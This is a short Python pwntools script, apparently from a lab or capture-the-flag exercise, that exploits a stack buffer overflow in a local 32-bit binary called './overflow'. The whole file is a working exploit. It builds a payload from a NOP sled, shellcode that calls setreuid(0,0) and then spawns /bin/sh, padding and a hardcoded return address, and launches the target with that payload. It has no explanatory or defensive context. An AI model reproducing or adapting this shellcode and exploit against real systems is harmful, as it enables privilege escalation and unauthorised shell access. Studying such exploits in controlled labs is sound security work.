#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit_pwn.py

from pwn import *

context.arch      = 'i686'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32
context.terminal  = ['tmux', 'new-window']

junk      = 'A' * 35
nop_sled  = asm('nop') * 32
ret_addr  = p32(0xbfffee18)

# setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])
shellcode = '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'

payload  = nop_sled
payload += shellcode
payload += nop_sled
payload += junk
payload += ret_addr

p = process(['./overflow', payload])
